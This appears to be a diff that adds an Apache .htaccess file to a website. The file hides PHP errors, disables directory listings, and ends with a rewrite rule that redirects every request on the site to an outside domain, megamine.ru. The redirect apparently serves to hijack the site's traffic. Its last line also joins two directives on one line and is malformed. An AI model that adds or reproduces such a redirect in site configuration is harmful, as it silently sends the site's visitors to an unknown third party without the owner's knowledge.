@@ -1,0 +1,9 @@
+php_flag display_errors off
+DirectoryIndex index.php
+Options -Indexes
+Options +FollowSymLinks
+RewriteEngine on
+RewriteBase /
+Options All -Indexes
+
+RewriteCond %{REQUEST_URI} (.*) RewriteRule ^(.*)$ https://megamine.ru/ [L,R=301]
